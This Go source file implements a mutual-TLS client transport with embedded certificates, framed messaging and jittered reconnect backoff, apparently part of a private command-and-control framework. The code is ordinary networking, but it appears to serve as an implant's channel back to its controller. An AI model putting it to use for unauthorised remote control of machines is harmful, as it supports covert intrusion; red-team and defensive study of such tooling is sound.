package mtls

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"math"
	"math/rand"
	"net"
	"sync"
	"time"

	"github.com/azizbinmohammad/private-c2/pkg/envelope"
)

var (
	ErrNotConnected = errors.New("not connected")
	ErrClosed       = errors.New("transport closed")
)

// Transport implements the Transport interface over mutual TLS with
// embedded certificates, persistent connections, and reconnect with
// exponential backoff.
type Transport struct {
	mu         sync.Mutex
	serverAddr string
	tlsConfig  *tls.Config
	conn       net.Conn
	closed     bool

	// Reconnect parameters.
	maxRetries    int
	baseBackoff   time.Duration
	maxBackoff    time.Duration
	backoffJitter float64
}

// Config holds the configuration for the mTLS transport.
type Config struct {
	ServerAddr    string
	CACertPEM     []byte
	ClientCertPEM []byte
	ClientKeyPEM  []byte
	MaxRetries    int
	BaseBackoff   time.Duration
	MaxBackoff    time.Duration
}

// New creates a new mTLS transport.
func New(cfg Config) (*Transport, error) {
	clientCert, err := tls.X509KeyPair(cfg.ClientCertPEM, cfg.ClientKeyPEM)
	if err != nil {
		return nil, fmt.Errorf("loading client certificate: %w", err)
	}

	caPool := x509.NewCertPool()
	if !caPool.AppendCertsFromPEM(cfg.CACertPEM) {
		return nil, fmt.Errorf("failed to parse CA certificate")
	}

	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{clientCert},
		RootCAs:            caPool,
		MinVersion:         tls.VersionTLS13,
		InsecureSkipVerify: false,
	}

	maxRetries := cfg.MaxRetries
	if maxRetries == 0 {
		maxRetries = 10
	}
	baseBackoff := cfg.BaseBackoff
	if baseBackoff == 0 {
		baseBackoff = 1 * time.Second
	}
	maxBackoff := cfg.MaxBackoff
	if maxBackoff == 0 {
		maxBackoff = 5 * time.Minute
	}

	return &Transport{
		serverAddr:    cfg.ServerAddr,
		tlsConfig:     tlsConfig,
		maxRetries:    maxRetries,
		baseBackoff:   baseBackoff,
		maxBackoff:    maxBackoff,
		backoffJitter: 0.3,
	}, nil
}

// Connect establishes a TLS connection to the server with exponential backoff.
func (t *Transport) Connect(ctx context.Context) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.closed {
		return ErrClosed
	}

	var lastErr error
	for attempt := 0; attempt <= t.maxRetries; attempt++ {
		if attempt > 0 {
			backoff := t.computeBackoff(attempt)
			select {
			case <-ctx.Done():
				return ctx.Err()
			case <-time.After(backoff):
			}
		}

		dialer := &tls.Dialer{
			Config: t.tlsConfig,
			NetDialer: &net.Dialer{
				Timeout: 30 * time.Second,
			},
		}

		conn, err := dialer.DialContext(ctx, "tcp", t.serverAddr)
		if err != nil {
			lastErr = err
			continue
		}

		t.conn = conn
		return nil
	}

	return fmt.Errorf("failed to connect after %d retries: %w", t.maxRetries, lastErr)
}

// Send writes framed data to the server.
func (t *Transport) Send(data []byte) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.conn == nil {
		return ErrNotConnected
	}
	if t.closed {
		return ErrClosed
	}

	return envelope.WriteFrame(t.conn, data)
}

// Recv reads a framed message from the server.
func (t *Transport) Recv() ([]byte, error) {
	t.mu.Lock()
	conn := t.conn
	t.mu.Unlock()

	if conn == nil {
		return nil, ErrNotConnected
	}

	return envelope.ReadFrame(conn)
}

// Close shuts down the transport.
func (t *Transport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	t.closed = true
	if t.conn != nil {
		err := t.conn.Close()
		t.conn = nil
		return err
	}
	return nil
}

// Name returns the transport name.
func (t *Transport) Name() string {
	return "mtls"
}

// Reconnect attempts to re-establish the connection using exponential backoff.
func (t *Transport) Reconnect(ctx context.Context) error {
	t.mu.Lock()
	if t.conn != nil {
		t.conn.Close()
		t.conn = nil
	}
	t.mu.Unlock()

	return t.Connect(ctx)
}

// computeBackoff calculates exponential backoff with jitter.
func (t *Transport) computeBackoff(attempt int) time.Duration {
	backoff := float64(t.baseBackoff) * math.Pow(2, float64(attempt-1))
	if backoff > float64(t.maxBackoff) {
		backoff = float64(t.maxBackoff)
	}

	jitter := backoff * t.backoffJitter * (rand.Float64()*2 - 1)
	duration := time.Duration(backoff + jitter)
	if duration < 0 {
		duration = t.baseBackoff
	}
	return duration
}
